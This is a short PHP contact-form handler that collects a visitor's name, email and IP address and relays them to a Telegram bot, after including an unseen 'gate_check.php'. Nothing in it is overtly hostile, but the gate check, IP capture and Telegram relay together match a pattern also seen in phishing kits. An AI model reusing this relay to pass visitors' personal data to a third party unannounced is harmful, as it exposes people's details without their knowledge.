<?php
require_once __DIR__ . '/gate_check.php';
ini_set('display_errors', 0);
header('Content-Type: application/json; charset=UTF-8');

require_once __DIR__ . '/data.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$nombre  = trim($_POST['nombre']  ?? '');
$email   = trim($_POST['email']   ?? '');
$tipo    = trim($_POST['tipo']    ?? 'Contacto');

if ($nombre === '' || $email === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
    exit;
}

// IP + UA
$ip = '';
foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
    if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
}
$ip   = $ip ?: '?';
$date = date('d/m/Y H:i:s');

$msg  = "📮 SOLICITUD DE CONTACTO — {$tipo}\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "👤 Nombre: {$nombre}\n";
$msg .= "✉️ Correo: {$email}\n";
$msg .= "🌐 IP: {$ip}\n";
$msg .= "🕒 Fecha: {$date}\n";

file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text'    => $msg,
]));

echo json_encode(['ok' => true]);
